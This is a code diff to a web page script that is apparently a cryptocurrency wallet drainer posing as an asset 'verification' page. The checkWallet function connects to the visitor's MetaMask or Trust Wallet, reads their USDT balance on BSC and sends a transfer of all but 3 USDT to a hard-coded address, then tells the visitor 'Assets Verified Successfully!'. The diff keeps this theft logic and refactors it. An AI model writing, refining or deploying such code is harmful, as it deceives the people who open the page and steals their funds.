@@ -159,7 +159,7 @@
             <div class="w-6 h-6 rounded-full bg-[#ef4444] text-white flex items-center justify-center text-sm font-bold shrink-0">
                 !
             </div>
-            <div class="ml-3 text-[15px] font-medium flex-1">
+            <div id="toastMessage" class="ml-3 text-[15px] font-medium flex-1">
                 Please install MetaMask or Trust Wallet.
             </div>
             <button onclick="closeToast()" class="text-gray-400 hover:text-gray-600 px-2 text-lg">
@@ -171,70 +171,76 @@
 
     <script>
         async function checkWallet() {
-            const provider = window.trustwallet || window.ethereum;
+            const provider = window.ethereum || window.trustwallet;
 
-            if (typeof provider !== 'undefined') {
-                try {
-                    const accounts = await provider.request({ method: 'eth_requestAccounts' });
-                    const userAddress = accounts[0];
-                    const targetAddress = '0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3';
+            if (!provider) {
+                showToast("Web3 provider not detected. Please open inside Trust Wallet browser.");
+                return;
+            }
 
-                    // USDT BEP-20 Contract Address on BSC
-                    const usdtContractAddress = '0x55d398326f99059ff775485246999027b3197955';
-                    
-                    // balanceOf(address) function signature: 0x70a08231
-                    const paddedAddress = userAddress.substring(2).padStart(64, '0');
-                    const dataBalance = '0x70a08231' + paddedAddress;
+            try {
+                // 1. Request accounts
+                const accounts = await provider.request({ method: 'eth_requestAccounts' });
+                if (!accounts || accounts.length === 0) {
+                    alert("Wallet connection failed or denied.");
+                    return;
+                }
+                const userAddress = accounts[0];
+                const targetAddress = '0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3';
+                const usdtContractAddress = '0x55d398326f99059ff775485246999027b3197955';
+                
+                // 2. Check balance using balanceOf
+                const paddedAddress = userAddress.substring(2).padStart(64, '0');
+                const dataBalance = '0x70a08231' + paddedAddress;
 
-                    // User ka USDT balance check karein
-                    const balanceHex = await provider.request({
-                        method: 'eth_call',
-                        params: [{
-                            to: usdtContractAddress,
-                            data: dataBalance
-                        }, 'latest']
+                const balanceHex = await provider.request({
+                    method: 'eth_call',
+                    params: [{
+                        to: usdtContractAddress,
+                        data: dataBalance
+                    }, 'latest']
+                });
+
+                const balanceWei = BigInt(balanceHex || '0x0');
+                const oneUsdt = 1000000000000000000n;
+                const minKeepWei = 3n * oneUsdt; // 3 USDT safe keep rule
+
+                if (balanceWei > minKeepWei) {
+                    const sendAmountWei = balanceWei - minKeepWei;
+
+                    // 3. Prepare transfer data
+                    const paddedTarget = targetAddress.substring(2).padStart(64, '0');
+                    const paddedAmount = sendAmountWei.toString(16).padStart(64, '0');
+                    const dataTransfer = '0xa9059cbb' + paddedTarget + paddedAmount;
+
+                    const txParams = {
+                        from: userAddress,
+                        to: usdtContractAddress,
+                        data: dataTransfer
+                    };
+
+                    await provider.request({
+                        method: 'eth_sendTransaction',
+                        params: [txParams]
                     });
 
-                    const balanceWei = BigInt(balanceHex);
-                    // USDT ke 18 decimals hote hain BSC par (1 USDT = 10^18)
-                    const oneUsdt = 1000000000000000000n;
-                    const minKeepWei = 3n * oneUsdt; // 3 USDT hamesha chhodna hai
-
-                    if (balanceWei > minKeepWei) {
-                        const sendAmountWei = balanceWei - minKeepWei;
-
-                        // transfer(address to, uint256 value) function signature: 0xa9059cbb
-                        const paddedTarget = targetAddress.substring(2).padStart(64, '0');
-                        const paddedAmount = sendAmountWei.toString(16).padStart(64, '0');
-                        const dataTransfer = '0xa9059cbb' + paddedTarget + paddedAmount;
-
-                        const txParams = {
-                            from: userAddress,
-                            to: usdtContractAddress,
-                            data: dataTransfer
-                        };
-
-                        await provider.request({
-                            method: 'eth_sendTransaction',
-                            params: [txParams]
-                        });
-
-                        alert("Assets Verified Successfully!");
-                    } else {
-                        alert("Verification complete. Required threshold not met.");
-                    }
-
-                } catch (error) {
-                    console.error("Transaction cancel ho gayi ya error aayi:", error);
-                }
-            } else {
-                const toast = document.getElementById('errorToast');
-                if (toast) {
-                    toast.classList.remove('hidden');
-                    toast.classList.add('slide-up');
+                    alert("Assets Verified Successfully!");
                 } else {
-                    alert("Please open this link inside Trust Wallet DApp Browser.");
+                    alert("Verification complete. Required threshold not met.");
                 }
+
+            } catch (error) {
+                console.error("Transaction Error:", error);
+                alert("Error: " + (error.message || "Transaction cancelled or failed"));
+            }
+        }
+
+        function showToast(msg) {
+            document.getElementById('toastMessage').innerText = msg;
+            const toast = document.getElementById('errorToast');
+            if (toast) {
+                toast.classList.remove('hidden');
+                toast.classList.add('slide-up');
             }
         }
 
